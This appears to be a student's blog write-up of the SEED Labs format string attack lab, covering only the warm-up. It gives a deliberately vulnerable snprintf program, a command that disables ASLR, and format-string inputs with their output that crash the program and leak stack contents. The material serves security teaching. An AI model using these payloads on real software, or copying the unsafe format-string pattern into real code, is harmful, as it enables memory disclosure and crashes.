---
layout:       post
title:        "SEED Labs 2.0: Format String Attack Lab Writeup"
category:     "Computing Systems"
tags:         system-security docker reverse-shell
permalink:    /fmtstr-seedlab/
---

For general overview and the setup package for this lab, please go to [SEED Labs official website](https://seedsecuritylabs.org/Labs_20.04/Files/Format_String/). The lab assignment was conducted using SEED virtual machine configured on a AWS EC2 instance along with containers. The set-up instructions for Docker Compose can be found [here](https://github.com/seed-labs/seed-labs/blob/master/manuals/docker/SEEDManual-Container.md).

The **Format Function**{: style="color: red"} is an ANSI C conversion function, like <code>printf</code>, <code>fprintf</code>, which converts a primitive variable of the programming language into a human-readable string representation. The **Format String**{: style="color: red"} is the argument of the Format Function and is an ASCII Z string which contains text and format parameters, like:
```c
printf("The magic number is: %d\n", 1911);
```
The **Format String Parameter**{: style="color: red"}, like <code>%x</code> or <code>%s</code>, defines the type of conversion of the format function[^1].

<!-- excerpt-end -->

|---
| | **Buffer Overflow** | **Format String**
|:-|:-|:-
| **Public since** | mid 1980's | June 1999
| **Danger realized** | 1990's | June 2000
| **Number of exploits** | a few thousands | a few dozen
| **Considered as** | security threat | programming bug
| **Techniques** | evolved and advanced | basic techniques
| **Visibility** | sometimes very difficult to spot | easy to find

*Table 1: Buffer Overflow vs. Format String Vulnerabilities, from [TESO Group's 2001 paper](https://cs155.stanford.edu/papers/formatstring-1.2.pdf)*[^2]
{:.table-caption}

<br />
## Table of Contents
{:.no_toc}
* TOC 
{:toc}
<br />

## Warm-up

Consider the following vulnerable C program:
```c
/***** fmtstr.c *****/
#include <stdio.h>

int main(int argc, char **argv)
{
    char buf[200];
    int val = 1;
    int buflen = 0;
    int strlen = 0;
    
    printf("buf is at: %p.\n", buf);
    printf("val is at: %p.\n", &val);
    if (argc != 2) {
        printf("usage: %s [user string]\n", argv[0]);
        return 1;
    }
    
    buflen = sizeof buf;
    strlen = snprintf(buf, buflen, argv[1]);
    if (strlen < 0 || strlen >= buflen) {
        printf("User string is not completely written!\n");
    }
    printf("buffer is %s.\n", buf);
    printf("val is %d/%#x (@ %p).\n", val, val, &val);
    return 0;
}
```

I received the following warning message after compilation:
```console
$ touch fmtstr.c
$ vim fmtstr.c
$ gcc -m32 fmtstr.c -o fmtstr
fmtstr.c: In function ‘main’:
fmtstr.c:18:5: warning: format not a string literal and no format arguments [-Wformat-security]
   18 |     strlen = snprintf(buf, buflen, argv[1]);
      |     ^~~~~~
```
which states that the third argument of <code>snprintf()</code> is not recognized by the format function as an appropriate ASCII Z string with format arguments and thus the program is vulnerable to malicious user string input. The safe way of using the format function is:
```c
snprintf(buf, sizeof buf, "%s", argv[1]);
```

Run the program a few times and then **turn off ASLR**:
```console
$ ./fmtstr
buf is at: 0xffd142d4.
val is at: 0xffd142c8.
usage: ./fmtstr [user string]
$ ./fmtstr AAAA
buf is at: 0xff96e864.
val is at: 0xff96e858.
buffer is AAAA.
val is 1/0x1 (@ 0xff96e858).
$ ./fmtstr %8$llx
buf is at: 0xff8f8dc4.
val is at: 0xff8f8db8.
User string is not completely written!
buffer is .
val is 1/0x1 (@ 0xff8f8db8).
$ echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
0
```

Try to construct an input that triggers a segmentation fault:
```console
$ ./fmtstr $(perl -e 'print "A"x300')
buf is at: 0xffffd444.
val is at: 0xffffd438.
User string is not completely written!
buffer is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.
val is 1/0x1 (@ 0xffffd438).
$ ./fmtstr %s%s%s%s
buf is at: 0xffffd564.
val is at: 0xffffd558.
Segmentation fault (core dumped)
```
For the first case, 199 <code>A</code>'s were printed out.

Try to find the beginning of my input string on the stack:
```console
$ ./fmtstr ABCD--%x--%x--%x--%x--%x--%x--%x--%x--%x--%x--%x
buf is at: 0xffffd544.
val is at: 0xffffd538.
buffer is ABCD--5655624c--0--100--40--ffffd6d4--40--200--1--c8--0--44434241.
val is 1/0x1 (@ 0xffffd538).
```

Replace the final <code>%x<code> first with <code>%hx</code>, then with <code>%hhx</code>:
```console
$ ./fmtstr ABCD--%x--%x--%x--%x--%x--%x--%x--%x--%x--%x--%hx
buf is at: 0xffffd544.
val is at: 0xffffd538.
buffer is ABCD--5655624c--0--100--40--ffffd6d4--40--200--1--c8--0--4241.
val is 1/0x1 (@ 0xffffd538).
$ ./fmtstr ABCD--%x--%x--%x--%x--%x--%x--%x--%x--%x--%x--%hhx
buf is at: 0xffffd544.
val is at: 0xffffd538.
buffer is ABCD--5655624c--0--100--40--ffffd6d4--40--200--1--c8--0--41.
val is 1/0x1 (@ 0xffffd538).
```
The four characters "<code>ABCD</code>" is stored on the stack in an order that "<code>D</code>" is at the highest address and "<code>A</code>" is at the lowest address. With "<code>%x<code>", four bytes of content are printed out at the start address of the input string, which should be read from right to left; with "<code>%hx</code>", only the lowest two bytes of content are printed out; with "<code>%hhx</code>", only the lowest one byte of content is printed out.

## References

[^1]: See [owasp.org](https://owasp.org/www-community/attacks/Format_string_attack).

[^2]: "Exploiting Format String Vulnerabilities" by TESO, Version 1.2, September 1, 2001.